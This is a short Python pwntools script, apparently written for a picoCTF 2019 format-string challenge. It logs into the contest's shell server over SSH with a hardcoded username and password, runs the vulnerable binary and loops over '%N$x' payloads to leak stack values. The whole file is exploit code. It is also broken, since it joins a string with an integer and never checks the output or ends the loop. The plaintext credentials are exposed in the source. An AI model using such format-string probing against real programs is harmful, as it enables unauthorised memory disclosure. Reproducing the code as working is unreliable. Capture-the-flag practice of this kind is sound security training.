# Format String Attack: https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be
from pwn import *
i = 0
while True:
    s=ssh(host="2019shell1.picoctf.com",user="Hohenheim10",password="mhw1015sz15,.")
    s.set_working_directory(wd=b"/problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4")
    p = s.process("./vuln")
    format_string = "%"+i+"$x"
    p.sendlineafter("input whatever string you want; then it will be printed back:\n", format_string)
    res = p.recvline()
    i+=1
